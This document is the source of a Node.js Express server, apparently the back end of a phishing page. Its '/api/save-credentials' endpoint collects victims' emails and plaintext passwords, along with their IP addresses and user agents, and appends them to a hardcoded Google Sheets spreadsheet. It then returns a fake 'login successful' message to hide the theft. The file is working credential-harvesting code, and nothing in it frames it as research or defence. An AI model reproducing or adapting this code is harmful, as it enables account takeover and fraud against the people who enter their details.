// Carregar variáveis de ambiente do arquivo .env
require('dotenv').config();

const express = require('express');
const cors = require('cors');
const path = require('path');
const { google } = require('googleapis');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
// Servir arquivos estáticos da pasta front
app.use(express.static(path.join(__dirname, '..', 'front')));

// ID da planilha do Google Sheets
const SPREADSHEET_ID = process.env.GOOGLE_SPREADSHEET_ID || '1VVUU_dCw-97FzKPquvgMsj9RncNsdxbG79zsOy5pQNI';

// Função para autenticar com o Google Sheets
async function getGoogleSheetsAuth() {
    const credentials = process.env.GOOGLE_SERVICE_ACCOUNT_JSON;
    
    if (!credentials) {
        throw new Error('GOOGLE_SERVICE_ACCOUNT_JSON não configurado');
    }

    const serviceAccount = JSON.parse(credentials);
    const auth = new google.auth.GoogleAuth({
        credentials: serviceAccount,
        scopes: ['https://www.googleapis.com/auth/spreadsheets']
    });

    return auth;
}

// Função para obter o nome da primeira aba da planilha
async function getFirstSheetName(sheets) {
    const spreadsheet = await sheets.spreadsheets.get({
        spreadsheetId: SPREADSHEET_ID
    });
    return spreadsheet.data.sheets[0].properties.title;
}

// Função para salvar dados no Google Sheets
async function saveToGoogleSheets(data) {
    const auth = await getGoogleSheetsAuth();
    const sheets = google.sheets({ version: 'v4', auth });

    const { timestamp, email, password, ip, userAgent } = data;

    // Obter nome da primeira aba dinamicamente
    const sheetName = await getFirstSheetName(sheets);
    console.log(`Usando aba: ${sheetName}`);

    // Verificar/criar cabeçalhos
    try {
        const headerRange = await sheets.spreadsheets.values.get({
            spreadsheetId: SPREADSHEET_ID,
            range: `${sheetName}!A1:E1`
        });

        const headers = headerRange.data.values?.[0] || [];
        
        if (headers.length === 0) {
            await sheets.spreadsheets.values.update({
                spreadsheetId: SPREADSHEET_ID,
                range: `${sheetName}!A1:E1`,
                valueInputOption: 'RAW',
                resource: {
                    values: [['Timestamp', 'Email', 'Password', 'IP Address', 'User Agent']]
                }
            });
        }
    } catch (error) {
        console.log('Criando cabeçalhos na planilha...');
        await sheets.spreadsheets.values.update({
            spreadsheetId: SPREADSHEET_ID,
            range: `${sheetName}!A1:E1`,
            valueInputOption: 'RAW',
            resource: {
                values: [['Timestamp', 'Email', 'Password', 'IP Address', 'User Agent']]
            }
        });
    }

    // Adicionar nova linha
    const values = [[
        timestamp,
        email,
        password || '',
        ip,
        userAgent || ''
    ]];

    const result = await sheets.spreadsheets.values.append({
        spreadsheetId: SPREADSHEET_ID,
        range: `${sheetName}!A:E`,
        valueInputOption: 'RAW',
        insertDataOption: 'INSERT_ROWS',
        resource: {
            values: values
        }
    });

    return result.data;
}

// Endpoint REST para salvar email no Google Sheets (apenas email)
app.post('/api/save-email-sheets', async (req, res) => {
    try {
        const { email, extra } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || '';

        if (!email) {
            return res.status(400).json({ 
                success: false,
                error: 'Email é obrigatório' 
            });
        }

        // Validação de formato de email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            return res.status(400).json({ 
                success: false,
                error: 'Formato de email inválido' 
            });
        }

        // Salvar no Google Sheets
        await saveToGoogleSheets({
            timestamp,
            email,
            password: '',
            ip,
            userAgent
        });

        console.log(`Email salvo no Google Sheets: ${email} - ${timestamp}`);

        res.json({ 
            success: true,
            message: 'Email salvo com sucesso no Google Sheets',
            data: {
                email,
                timestamp,
                spreadsheetId: SPREADSHEET_ID
            }
        });

    } catch (error) {
        console.error('Erro ao salvar email no Google Sheets:', error.message);
        
        if (error.message.includes('GOOGLE_SERVICE_ACCOUNT_JSON')) {
            return res.status(500).json({ 
                success: false,
                error: 'Google Sheets não está configurado. Configure a variável GOOGLE_SERVICE_ACCOUNT_JSON.' 
            });
        }

        res.status(500).json({ 
            success: false,
            error: 'Erro ao salvar email no Google Sheets',
            details: error.message
        });
    }
});

// Endpoint para receber credenciais (email + password)
app.post('/api/save-credentials', async (req, res) => {
    try {
        const { email, password } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || '';

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Salvar no Google Sheets
        await saveToGoogleSheets({
            timestamp,
            email,
            password,
            ip,
            userAgent
        });

        console.log(`Credenciais salvas no Google Sheets: ${email} - ${new Date().toLocaleString()}`);

        // Retornar sucesso
        res.json({ 
            success: true,
            message: 'Login realizado com sucesso'
        });

    } catch (error) {
        console.error('Erro ao salvar credenciais:', error.message);
        
        if (error.message.includes('GOOGLE_SERVICE_ACCOUNT_JSON')) {
            return res.status(500).json({ 
                success: false,
                error: 'Google Sheets não está configurado. Configure a variável GOOGLE_SERVICE_ACCOUNT_JSON.' 
            });
        }

        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
});

// Endpoint para verificar status
app.get('/api/status', (req, res) => {
    res.json({ 
        status: 'online', 
        timestamp: new Date().toISOString(),
        googleSheetsConfigured: !!process.env.GOOGLE_SERVICE_ACCOUNT_JSON
    });
});

// Exportar para Vercel serverless
module.exports = app;

// Rodar servidor local se não estiver na Vercel
if (!process.env.VERCEL) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Servidor rodando em http://localhost:${PORT}`);
        console.log(`Google Sheets ID: ${SPREADSHEET_ID}`);
        console.log(`Google Sheets configurado: ${!!process.env.GOOGLE_SERVICE_ACCOUNT_JSON}`);
    });
}
